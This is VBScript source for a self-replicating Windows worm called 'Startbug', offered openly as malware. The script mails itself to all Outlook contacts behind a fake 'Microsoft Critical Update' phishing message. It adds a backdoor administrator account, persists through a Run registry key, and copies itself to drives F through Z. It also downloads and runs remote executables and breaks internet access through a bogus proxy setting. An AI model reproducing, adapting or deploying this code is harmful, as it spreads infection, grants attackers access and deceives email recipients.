   'Startbug Virus
   'Created by phantom deamon

   On error resume next
   Set ws = createobject("wscript.shell")
   Set FSO = Createobject("scripting.filesystemobject")
   'Startbug adds a user for hackers to use
   Ws.Run("net user startbug /add"), 0


   'Virus sends itself in e-mail as attachment in e-mail
   Function Mailit()
   On Error Resume Next
   Set Outlook = CreateObject("Outlook.Application")
   If Outlook = "Outlook" Then
   Set Mapi=Outlook.GetNameSpace("MAPI")
   Set Lists=Mapi.AddressLists
   For Each ListIndex In Lists
   If ListIndex.AddressEntries.Count <> 0 Then
   ContactCount = ListIndex.AddressEntries.Count
   For Count= 1 To ContactCount
   Set Mail = Outlook.CreateItem(0)
   Set Contact = ListIndex.AddressEntries(Count)
   Mail.From = msupport
   Mail.To = Contact.Address
   Mail.Subject = "Microsoft Critical Update"
   Mail.Body = vbcrlf&"Dear Windows User"&vbcrlf&vbcrlf&"Our Windows watch server has detected that you have not got full protection against viruses and spyware. Open the attachment to recieve the update manager."&vbcrlf&vbcrlf
   Set Attachment=Mail.Attachments
   On error resume next
   Attachment.Add Folder & "C:\windows\sysfile.vbs"
   Mail.DeleteAfterSubmit = True
   If Mail.To <> "" Then
                                   Mail.Send
                                   WS.regwrite "HKCU\software\Vbs.FHE\Sent to ther machines", "1"
                           End If
                           Next
                   End If
           Next
   End if
   End Function


   'startbug sets a registry entry in order to run on startup
   WS.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AdminSoft", "c:\Windows\System32\sysfile.vbs"

   'virus copies itself to c:\ drive
   Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
   Do While InF.AtEndOfStream<>True
   ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
   Loop

   Set OutF=FSO.OpenTextFile(Folder&"C:\Windows\System32\sysfile.vbs",2,true)
   OutF.write ScriptBuffer
   OutF.close
   Set FSO=Nothing

   'startbug creates a new user for access to the computer remotly at some point.
   On error resume next
   WS.Run("net user startbug startbug /add"), 0
   WS.Run("net localgroup administrators startbug /add"), 0

   'startbug signs itself into the installed programs list
   WS.Regwrite "HKLM\Software\Microsoft\Windows\Currentversion\Uninstall\{startbug}\DisplayName", "startbug Virus"
   WS.Regwrite "HKLM\Software\Microsoft\Windows\Currentversion\Uninstall\{startbug}\UninstallString", "C:\Windows\Explorer.exe"

   'Virus spreads to all drives except C:\
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "F:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "G:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "H:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "I:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "J:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "K:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "L:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "M:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "N:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "O:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "P:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "Q:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "R:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "S:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "T:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "U:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "V:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "W:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "X:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "Y:\Read This.vbs"
   FSO.CopyFile "c:\windows\system32\sysfile.vbs", "Z:\Read This.vbs"

   Downloadprank1()

   Sub Downloadprank1()

   'startbug downloads a prank which causes the CDROM drive to open
   On error resume next
   sSource = "http://www.computerpranks.com/download/programs/prank/cd.exe"
   sDest = "c:\windows\cd.exe"
   set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
   oHTTP.open "GET", sSource, False
   oHTTP.send
   tStart = timer()
   set oStream = createobject("adodb.stream")
   Const adTypeBinary = 1
   Const adSaveCreateNotExist = 1
   Const adSaveCreateOverWrite = 2
   oStream.type = adTypeBinary
   oStream.open
   oStream.write oHTTP.responseBody
   oStream.savetofile sDest, adSaveCreateOverWrite
   set oStream = nothing
   tElapsed = timer() - tStart
   End Sub

   downloadprank2()

   sub downloadprank2()
   'startbug downloads a prank which causes start button to vanish!!!
   On error resume next
   sSource = "http://www.computerpranks.com/download/programs/prank/hidestart.exe"
   sDest = "c:\windows\hidestart.exe"
   set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
   oHTTP.open "GET", sSource, False
   oHTTP.send
   tStart = timer()
   set oStream = createobject("adodb.stream")
   Const adTypeBinary = 1
   Const adSaveCreateNotExist = 1
   Const adSaveCreateOverWrite = 2
   oStream.type = adTypeBinary
   oStream.open
   oStream.write oHTTP.responseBody
   oStream.savetofile sDest, adSaveCreateOverWrite
   set oStream = nothing
   tElapsed = timer() - tStart
   End Sub

   ThemeOff()

   Sub ThemeOff()
   ws.run("Net stop themes"), 0
   wscript.sleep 3000
   ws.run("Net start themes"), 0
   wscript.sleep 3000
   ws.run("Net stop themes"), 0
   wscript.sleep 3000
   ws.run("Net start themes"), 0
   End Sub

   'If the infected computer is using a poxy server for internet access, startbug stops internet
   'access by changing the proxy address to its name.
   WS.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer", "000.000.0.00:0000"

   wscript.sleep 50000

   WS.Run("c:\windows\hidestart.exe"), 0
   Wscript.sleep 50000
   WS.Run("c:\windows\cd.exe"), 0
